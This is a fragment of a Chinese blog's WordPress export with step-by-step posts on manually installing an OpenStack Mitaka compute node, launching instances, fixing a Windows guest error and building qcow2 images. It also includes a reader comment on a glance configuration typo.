			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>33</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>35</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.150]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-09-08 13:48:51]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-09-08 05:48:51]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[logistics 老师的回复的解决方案均可行。
我这次问题一的镜像上传报403错误是参数写错了，文档太多，容易敲错。
glance-api和glacne-registry的参数
openstack-config --set /etc/glance/glance-api.conf paste_deploy flavor keystone 中的 flavor ，我写成了flaovr。导致上传出错。
此配置是让glance使用keystone授权，403刚好就是权限不足的报错。]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>33</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>OpenStack Mitaka手动安装 - 搭建Compute节点</title>
		<link>https://www.nervgeek.com/2016/09/08/openstack-mitaka%e6%89%8b%e5%8a%a8%e5%ae%89%e8%a3%85-%e6%90%ad%e5%bb%bacompute%e8%8a%82%e7%82%b9/</link>
		<pubDate>Thu, 08 Sep 2016 15:13:07 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1510</guid>
		<description></description>
		<content:encoded><![CDATA[<h6><span style="font-size: 18pt;">
0x01  安装准备</span></h6>

<span style="font-size: 14pt;"><strong>环境：</strong></span>
VMware 12 prohttps://www.nervgeek.com/pages/1451.html

<table>
<tbody>
<tr>
<td>虚拟机名称</td>
<td>内存</td>
<td>CPU核数</td>
</tr>
<tr>
<td>compute</td>
<td>4G</td>
<td>4核</td>
</tr>
<tr>
<td>硬盘容量</td>
<td>网卡一</td>
<td>网卡二</td>
</tr>
<tr>
<td>40G</td>
<td>192.168.188.129</td>
<td>10.0.0.3</td>
</tr>
</tbody>
</table>

<span style="font-size: 12pt;">虚拟机的网络配置请参考 <a href="https://www.nervgeek.com/pages/1451.html">OpenStack Mitaka手动安装 – 搭建Controller节点</a> 第 0x01 章节。</span>
&nbsp;

<h6>0x02 系统安装</h6>

<span style="font-size: 12pt;">虚拟机的系统安装请参考 <a href="https://www.nervgeek.com/pages/1451.html">OpenStack Mitaka手动安装 – 搭建Controller节点</a> 第 0x03 章节。</span>
&nbsp;

<h6><span style="font-size: 18pt;">0x03 系统配置和安装必备软件</span></h6>

<span style="font-size: 12pt;">虚拟机的系统配置和安装必备软件请参考 <a href="https://www.nervgeek.com/pages/1451.html">OpenStack Mitaka手动安装 – 搭建Controller节点</a> 第 0x03 章节。</span>
<span style="font-size: 12pt;">IP记得替换！</span>
&nbsp;

<h6><span style="font-size: 18pt;">0x04 安装 Nova</span></h6>

<strong><span style="font-size: 14pt;">1、安装 Nova 组件以及 OpenStack 配置软件</span></strong>

<pre>yum install -y openstack-selinux python-openstackclient yum-plugin-priorities openstack-nova-compute openstack-utils</pre>

<!--more-->
<strong><span style="font-size: 14pt;">2、配置 Nova 配置文件</span></strong>

<pre>openstack-config --set /etc/nova/nova.conf DEFAULT rpc_backend rabbit
openstack-config --set /etc/nova/nova.conf oslo_messaging_rabbit rabbit_host 192.168.188.128
openstack-config --set /etc/nova/nova.conf oslo_messaging_rabbit rabbit_userid openstack
openstack-config --set /etc/nova/nova.conf oslo_messaging_rabbit rabbit_password 123456
openstack-config --set /etc/nova/nova.conf DEFAULT auth_strategy keystone
openstack-config --set /etc/nova/nova.conf keystone_authtoken auth_uri http://192.168.188.128:5000
openstack-config --set /etc/nova/nova.conf keystone_authtoken auth_url http://192.168.188.128:35357
openstack-config --set /etc/nova/nova.conf keystone_authtoken memcached_servers 192.168.188.128:11211
openstack-config --set /etc/nova/nova.conf keystone_authtoken auth_type password
openstack-config --set /etc/nova/nova.conf keystone_authtoken project_domain_name default
openstack-config --set /etc/nova/nova.conf keystone_authtoken user_domain_name default
openstack-config --set /etc/nova/nova.conf keystone_authtoken project_name service
openstack-config --set /etc/nova/nova.conf keystone_authtoken username nova
openstack-config --set /etc/nova/nova.conf keystone_authtoken password 123456
openstack-config --set /etc/nova/nova.conf DEFAULT my_ip 192.168.188.129
openstack-config --set /etc/nova/nova.conf DEFAULT use_neutron True
openstack-config --set /etc/nova/nova.conf DEFAULT firewall_driver nova.virt.firewall.NoopFirewallDriver
openstack-config --set /etc/nova/nova.conf vnc enable True
openstack-config --set /etc/nova/nova.conf vnc vncserver_listen 0.0.0.0
openstack-config --set /etc/nova/nova.conf vnc vncserver_proxyclient_address 192.168.188.129
openstack-config --set /etc/nova/nova.conf vnc novncproxy_base_url http://192.168.188.128:6080/vnc_auto.html
openstack-config --set /etc/nova/nova.conf glance api_servers http://192.168.188.128:9292
openstack-config --set /etc/nova/nova.conf oslo_concurrency lock_path /var/lib/nova/tmp
openstack-config --set /etc/nova/nova.conf libvirt virt_type qemu
openstack-config --set /etc/nova/nova.conf DEFAULT vif_plugging_is_fatal False
openstack-config --set /etc/nova/nova.conf DEFAULT vif_plugging_timeout 0</pre>

<strong><span style="font-size: 14pt;">3、设置 Nova 服务开机开启、启动 Nova 服务并查看状态</span></strong>

<pre>systemctl enable libvirtd.service openstack-nova-compute.service
systemctl restart libvirtd.service openstack-nova-compute.service
systemctl status libvirtd.service openstack-nova-compute.service</pre>

<span style="font-size: 14pt;"><strong>4、创建 admin 用户变量脚本文件、demo 用户变量脚本文件</strong></span>
保存在root目录下。
<strong>admin-openrc.sh：</strong>

<pre>vim ~/admin-openrc.sh</pre>

输入：
密码为 <code>123456</code>

<pre>export OS_PROJECT_DOMAIN_NAME=default
export OS_USER_DOMAIN_NAME=default
export OS_PROJECT_NAME=admin
export OS_USERNAME=admin
export OS_PASSWORD=123456
export OS_AUTH_URL=http://192.168.188.128:35357/v3
export OS_IDENTITY_API_VERSION=3</pre>

<strong>demo-openrc.sh：</strong>

<pre>vim ~/demo-openrc.sh</pre>

输入：
密码为 <code>123456</code>

<pre>export OS_PROJECT_DOMAIN_NAME=default
export OS_USER_DOMAIN_NAME=default
export OS_PROJECT_NAME=demo
export OS_USERNAME=demo
export OS_PASSWORD=123456
export OS_AUTH_URL=http://192.168.188.128:35357/v3
export OS_IDENTITY_API_VERSION=3</pre>

<strong><span style="font-size: 14pt;">5、验证</span></strong>

<pre>source ~/admin-openrc.sh
openstack compute service list</pre>

&nbsp;

<h6><span style="font-size: 18pt;">0x05 安装 Neutron</span></h6>

<strong><span style="font-size: 14pt;">1、安装 Neutron 组件</span></strong>

<pre>yum install -y openstack-neutron-linuxbridge ebtables ipset</pre>

<strong><span style="font-size: 14pt;">2、配置 Neutron 配置文件</span></strong>

<pre>sed -i '/^connection/d' /etc/neutron/neutron.conf
openstack-config --set /etc/neutron/neutron.conf DEFAULT rpc_backend rabbit
openstack-config --set /etc/neutron/neutron.conf oslo_messaging_rabbit rabbit_host 192.168.188.128
openstack-config --set /etc/neutron/neutron.conf oslo_messaging_rabbit rabbit_userid openstack
openstack-config --set /etc/neutron/neutron.conf oslo_messaging_rabbit rabbit_password 123456
openstack-config --set /etc/neutron/neutron.conf DEFAULT auth_strategy keystone
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken auth_uri http://192.168.188.128:5000
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken auth_url http://192.168.188.128:35357
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken memcached_servers 192.168.188.128:11211
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken auth_type password
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken project_domain_name default
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken user_domain_name default
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken project_name service
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken username neutron
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken password 123456
openstack-config --set /etc/neutron/neutron.conf oslo_concurrency lock_path /var/lib/neutron/tmp</pre>

<span style="font-size: 14pt;"><strong>3、配置 /etc/neutron/plugins/ml2/linuxbridge_agent.ini 配置文件</strong></span>

<pre>openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini linux_bridge physical_interface_mappings provider:eno33554960
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini vxlan enable_vxlan True
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini vxlan local_ip 192.168.188.129
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini vxlan l2_population True
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini securitygroup enable_security_group True
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini securitygroup firewall_driver neutron.agent.linux.iptables_firewall.IptablesFirewallDriver</pre>

<strong><span style="font-size: 14pt;">4、追加 Nova 配置</span></strong>

<pre>openstack-config --set /etc/nova/nova.conf neutron url http://192.168.188.128:9696
openstack-config --set /etc/nova/nova.conf neutron auth_url http://192.168.188.128:35357
openstack-config --set /etc/nova/nova.conf neutron auth_type password
openstack-config --set /etc/nova/nova.conf neutron project_domain_name default
openstack-config --set /etc/nova/nova.conf neutron user_domain_name default
openstack-config --set /etc/nova/nova.conf neutron region_name RegionOne
openstack-config --set /etc/nova/nova.conf neutron project_name service
openstack-config --set /etc/nova/nova.conf neutron username neutron
openstack-config --set /etc/nova/nova.conf neutron password 123456</pre>

<strong><span style="font-size: 14pt;">5、配置开机启动、启动服务以及查看状态</span></strong>

<pre>systemctl restart openstack-nova-compute.service
systemctl enable neutron-linuxbridge-agent.service
systemctl restart neutron-linuxbridge-agent.service
systemctl status openstack-nova-compute.service neutron-linuxbridge-agent.service</pre>

<strong><span style="font-size: 14pt;">6、验证</span></strong>

<pre>source ~/admin-openrc.sh
neutron ext-list
neutron agent-list</pre>

<span style="font-size: 12pt;">Compute 节点搭建完毕！想添加更多节点，可重复以上步骤，记得替换 ip 地址。</span>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1510</wp:post_id>
		<wp:post_date><![CDATA[2016-09-08 23:13:07]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-09-08 15:13:07]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[openstack-mitaka%e6%89%8b%e5%8a%a8%e5%ae%89%e8%a3%85-%e6%90%ad%e5%bb%bacompute%e8%8a%82%e7%82%b9]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[266]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>OpenStack Mitaka手动安装 – 实例操作</title>
		<link>https://www.nervgeek.com/2016/09/09/openstack-mitaka%e6%89%8b%e5%8a%a8%e5%ae%89%e8%a3%85-%e5%ae%9e%e4%be%8b%e6%93%8d%e4%bd%9c/</link>
		<pubDate>Fri, 09 Sep 2016 00:18:39 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1517</guid>
		<description></description>
		<content:encoded><![CDATA[<h6><span style="font-size: 18pt;">0x01  新建实例</span></h6>

<span style="font-size: 18.6667px; line-height: 31.7333px;"><b>1、打开新建界面</b></span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/TLBRK7E5H52408K3I2SST.png"><img class="alignnone size-full wp-image-1519" src="https://www.nervgeek.com/wp-content/uploads/2016/09/TLBRK7E5H52408K3I2SST.png" alt="tlbrk7e5h5%2408k3i2sst" width="1775" height="1058" /></a>
<strong><span style="font-size: 14pt;">2、填写实例信息</span></strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/WKC95DO5UE_U3Z6EGE.png"><img class="alignnone size-full wp-image-1520 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/WKC95DO5UE_U3Z6EGE.png" alt="wkc95do5ue_u3z6ege" width="1200" height="647" /></a>

<p style="text-align: center;"><code><span style="font-size: 12pt;">填写实例名称(注意不要带小数点)。</span></code></p>

<p style="text-align: center;"><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/6XM8UMJYD8R__LDZOK8.png"><img class="alignnone size-full wp-image-1521" src="https://www.nervgeek.com/wp-content/uploads/2016/09/6XM8UMJYD8R__LDZOK8.png" alt="6xm8umjyd8r__ldzok8" width="1200" height="811" /></a></p>

<p style="text-align: center;"><code>选择镜像(其余镜像是我另外下载的)。</code></p>

<!--more-->

<p style="text-align: center;"><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/6KUM1B4NXM24FZGDJ.png"><img class="alignnone size-full wp-image-1522" src="https://www.nervgeek.com/wp-content/uploads/2016/09/6KUM1B4NXM24FZGDJ.png" alt="6kum1b4nxm24fzgdj" width="1200" height="835" /></a></p>

<p style="text-align: center;"><code>选择实例类型(m1.tiny我修改过，默认即可)。</code></p>

<p style="text-align: center;"><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/2_4BB1AYNERW9W.png"><img class="alignnone size-full wp-image-1523" src="https://www.nervgeek.com/wp-content/uploads/2016/09/2_4BB1AYNERW9W.png" alt="2_4bb1aynerw9w" width="1200" height="647" /></a></p>

<p style="text-align: center;"><code>选择私有网络(待会通过绑定浮动IP实现和外网通信)。</code></p>

<p style="text-align: center;"><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/DT2V45ZUTJLX2LHU0BKQ.png"><img class="alignnone size-full wp-image-1524" src="https://www.nervgeek.com/wp-content/uploads/2016/09/DT2V45ZUTJLX2LHU0BKQ.png" alt="dt2v45zutjlx2lhu0bkq" width="1200" height="647" /></a></p>

<p style="text-align: center;"><code>选择我们之前命令创建过的安全组。</code></p>

<strong><span style="font-size: 14pt;">3、绑定浮动IP</span></strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/B8R7OZCJEW8N9IT1.png"><img class="alignnone size-full wp-image-1525 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/B8R7OZCJEW8N9IT1.png" alt="b8r7ozcjew8n9it1" width="1775" height="1058" /></a>

<p style="text-align: center;"><code>界面位置。</code></p>

<p style="text-align: center;"><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/B9A2POQK5VK687BTHE.png"><img class="alignnone size-full wp-image-1526" src="https://www.nervgeek.com/wp-content/uploads/2016/09/B9A2POQK5VK687BTHE.png" alt="b9a2poqk5vk687bthe" width="913" height="438" /></a></p>

<p style="text-align: center;"><code>点击添加。</code></p>

<p style="text-align: center;"><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/XPQ@4OUOZLN_5RU97U.png"><img class="alignnone size-full wp-image-1527" src="https://www.nervgeek.com/wp-content/uploads/2016/09/XPQ@4OUOZLN_5RU97U.png" alt="xpq4ouozln_5ru97u" width="915" height="436" /></a></p>

<p style="text-align: center;"><code>分配IP。</code></p>

<p style="text-align: center;"><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/A1T9IGIOP75KYDHTV3J.png"><img class="alignnone size-full wp-image-1528" src="https://www.nervgeek.com/wp-content/uploads/2016/09/A1T9IGIOP75KYDHTV3J.png" alt="a1t9igiop75kydhtv3j" width="915" height="438" /></a></p>

<p style="text-align: center;">关联。</p>

<strong><span style="font-size: 14pt;">4、配置实例系统，使用ssh连接实例</span></strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/YANED8ITO3PZ28FTQFT.png"><img class="alignnone size-full wp-image-1529" src="https://www.nervgeek.com/wp-content/uploads/2016/09/YANED8ITO3PZ28FTQFT.png" alt="yaned8ito3pz28ftqft" width="1775" height="1058" /></a>

<p style="text-align: center;"><code>全屏打开才可以输入。</code></p>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/Y9A1NHVQYCTQS@A9D.png"><img class="alignnone size-full wp-image-1530" src="https://www.nervgeek.com/wp-content/uploads/2016/09/Y9A1NHVQYCTQS@A9D.png" alt="y9a1nhvqyctqsa9d" width="1775" height="1058" /></a>

<p style="text-align: center;"><code>账号： cirros 。密码 cubswin:) 。</code></p>

<strong><span style="font-size: 14pt;">输入命令修改密码：</span></strong>

<pre>sudo passwd
/*密码要求复杂度，不要输入简单密码*/</pre>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/XOEX@G7Z07_KRCLD28V70.png"><img class="alignnone size-full wp-image-1531" src="https://www.nervgeek.com/wp-content/uploads/2016/09/XOEX@G7Z07_KRCLD28V70.png" alt="xoexg7z07_krcld28v70" width="1775" height="1058" /></a>

<p style="text-align: center;"><code>root密码修改成功。</code></p>

<strong><span style="font-size: 12pt;">使用ssh连接：</span></strong><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/OQ84KF2LRZC0I@H96.png"><img class="alignnone size-full wp-image-1532" src="https://www.nervgeek.com/wp-content/uploads/2016/09/OQ84KF2LRZC0I@H96.png" alt="oq84kf2lrzc0ih96" width="1179" height="266" /></a>
<strong><span style="font-size: 12pt;">查看浮动IP，在终端使用ssh连接：</span></strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/HVXWFODHPPUSE6KBB6.png"><img class="alignnone size-full wp-image-1533" src="https://www.nervgeek.com/wp-content/uploads/2016/09/HVXWFODHPPUSE6KBB6.png" alt="hvxwfodhppuse6kbb6" width="1506" height="1016" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1517</wp:post_id>
		<wp:post_date><![CDATA[2016-09-09 08:18:39]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-09-09 00:18:39]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[openstack-mitaka%e6%89%8b%e5%8a%a8%e5%ae%89%e8%a3%85-%e5%ae%9e%e4%be%8b%e6%93%8d%e4%bd%9c]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[156]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>OpenStack 问题集合 - 不定时更新</title>
		<link>https://www.nervgeek.com/2016/09/10/openstack-%e9%97%ae%e9%a2%98%e9%9b%86%e5%90%88-%e4%b8%8d%e5%ae%9a%e6%97%b6%e6%9b%b4%e6%96%b0/</link>
		<pubDate>Fri, 09 Sep 2016 16:00:30 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1536</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 14pt;">一、安装 Windows 7 x64 位时报 0x0000005d 错误</span></strong>
<strong><span style="font-size: 14pt;">配置 /etc/nova/nova.conf 文件：</span></strong>

<pre>virt_type = kvm
cpu_mode=host-model</pre>

重启 openstack-nova-compute 服务，再新建虚拟机。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1536</wp:post_id>
		<wp:post_date><![CDATA[2016-09-10 00:00:30]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-09-09 16:00:30]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[openstack-%e9%97%ae%e9%a2%98%e9%9b%86%e5%90%88-%e4%b8%8d%e5%ae%9a%e6%97%b6%e6%9b%b4%e6%96%b0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[159]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>OpenStack镜像制作(Windows和Linux)</title>
		<link>https://www.nervgeek.com/2016/09/13/openstack%e9%95%9c%e5%83%8f%e5%88%b6%e4%bd%9cwindows%e5%92%8clinux/</link>
		<pubDate>Tue, 13 Sep 2016 01:08:46 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1540</guid>
		<description></description>
		<content:encoded><![CDATA[<span style="font-size: 12pt;">OpenStack镜像都是安装好的镜像，以达到创建启动即可用。创建一个镜像非常简单，简单来说就类似VMware新建虚拟机安装好之后，拷走虚拟机文件四处启动，开机就是安装好的状态。</span>
<span style="font-size: 12pt;">Ubuntu有提供支持KVM的镜像，地址：<a href="http://cloud-images.ubuntu.com/">Ubuntu镜像下载</a></span>
<span style="font-size: 12pt;">创建镜像环境，CentOS 7 64位。</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/I0152K1M9_0Q6SX63L.png"><img class="alignnone size-full wp-image-1541" src="https://www.nervgeek.com/wp-content/uploads/2016/09/I0152K1M9_0Q6SX63L.png" alt="i0152k1m9_0q6sx63l" width="2333" height="919" /></a>
<span style="font-size: 12pt;">接下来需要安装工具：</span>

<pre>yum install qemu-kvm qemu-img vnc-server -y</pre>

<code>qemu-kvm</code> <span style="font-size: 12pt;">主要用于创建和管理虚拟机，</span><code>qemu-img</code> <span style="font-size: 12pt;">主要用于创建和管理虚拟机磁盘镜像，<code>vnc-server</code> 用于连接kvm操作。更多的介绍、使用方法可自行百度。</span>
<span style="font-size: 12pt;">Windwos VNC Viewer 软件下载 ：<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/vncviewer.rar">vncviewer</a>。</span>
&nbsp;

<h6><span style="font-size: 18pt;">Linux 镜像制作</span></h6>

<span style="font-size: 12pt;">现在我们尝试制作一个CentOS 6.4的镜像。镜像 <code>CentOS-6.6-x86_64-minimal.iso</code> 。minimal版的CentOS。下载地址：<a href="http://mirror.nsc.liu.se/centos-store/6.4/isos/x86_64/">CentOS 6.4</a>。</span>
<strong><span style="font-size: 14pt;">1、创建磁盘</span></strong>
<span style="font-size: 12pt;">创建一个磁盘镜像，用来安装虚拟机：</span>

<pre>qemu-img create -f qcow2 CentOS_64_x86_64_mini.qcow2 5G</pre>

<span style="font-size: 12pt;">创建一个名为 CentOS_64_x86_64_mini 格式为 qcow2 的磁盘，大小为5G。</span>
<span style="font-size: 12pt;">qcow2有个优点，需要时才分配存储空间，且可压缩，这大大减少了镜像的传输时间。</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/KA6FZ6@6Z9KLMDTBFH.png"><img class="alignnone size-full wp-image-1544" src="https://www.nervgeek.com/wp-content/uploads/2016/09/KA6FZ6@6Z9KLMDTBFH.png" alt="ka6fz66z9klmdtbfh" width="889" height="326" /></a>
<strong><span style="font-size: 14pt;">2、创建虚拟机</span></strong>
<span style="font-size: 12pt;">镜像拉进虚拟机，使用命令创建虚拟机。</span>

<pre>/usr/libexec/qemu-kvm -m 512 -cdrom CentOS-6.4-x86_64-minimal.iso \
-drive file=CentOS_64_x86_64_mini.qcow2,format=qcow2 -boot c -usb -usbdevice tablet -nographic -vnc :10</pre>

<span style="font-size: 12pt;">创建一个内存大小为 <code>512 MB</code> 的虚拟机。<code>-cdrom</code> 挂载iso文件，<code>-drive file</code> 指定磁盘文件，<code>-usb -usbdevice tablet</code> 可解决 vncviewer 上鼠标不同步问题，<code>-nographic -vnc :10</code> 指定 vnc 端口号是10。</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/FAQJ@SDROYX1@ZZKL7.png"><img class="alignnone size-full wp-image-1546" src="https://www.nervgeek.com/wp-content/uploads/2016/09/FAQJ@SDROYX1@ZZKL7.png" alt="faqjsdroyx1zzkl7" width="985" height="448" /></a>
<span style="font-size: 12pt;">无任何提示，此时可使用viewer连接。</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/NRLRXJ45BSJQVP28HXD.png"><img class="size-full wp-image-1547 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/NRLRXJ45BSJQVP28HXD.png" alt="nrlrxj45bsjqvp28hxd" width="503" height="205" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/R4CSOBUDU0@JXQU1.png"><img class="size-full wp-image-1548 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/R4CSOBUDU0@JXQU1.png" alt="r4csobudu0jxqu1" width="802" height="671" /></a>
<span style="font-size: 12pt;">接下来就是安装系统的步骤了。</span>
安装完之后可用该命令进行压缩，因为创建出来的qcow2是稀疏文件，真实空间并没有创建那么大：

<pre>qemu-img convert -c -O qcow2 CentOS_64_x86_64_mini.qcow2 CentOS_64_x86_64_mini_done.qcow2</pre>

5G 压缩成 300M不到。
&nbsp;

<h6><span style="font-size: 18pt;">Windows 镜像制作</span></h6>

<span style="font-size: 12pt;">制作 Windows 镜像和制作 Linux 镜像最大的区别在于，Windows 系统需要我们去给磁盘、网络安装驱动——<a href="http://fedoraproject.org/wiki/Windows_Virtio_Drivers">virtio驱动</a>。</span>
<span style="font-size: 12pt;">接下来我们制作一个 windows_7_ultimate_x86 的镜像，使用 virtio-win-0.1.102 版本驱动。驱动文件下载：<a href="http://pan.baidu.com/s/1dFFRGwp">virtio-win-0.1.102</a></span>
<span style="font-size: 12pt;">新建一个 20G 大小的磁盘：</span>

<pre>qemu-img create -f qcow2 Windows_7_ultimate_x86.qcow2 20G</pre>

<span style="font-size: 12pt;">启动虚拟机：</span>

